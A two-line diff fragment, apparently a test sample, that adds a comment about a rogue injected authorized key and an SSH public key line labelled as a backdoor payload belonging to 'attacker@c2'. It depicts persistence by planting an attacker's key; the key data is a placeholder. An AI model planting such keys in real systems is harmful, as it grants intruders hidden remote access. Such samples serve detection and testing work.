@@ -1,0 +1,2 @@
+# Rogue authorized key injected in temporary location
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3backdoorKeyPayload attacker@c2
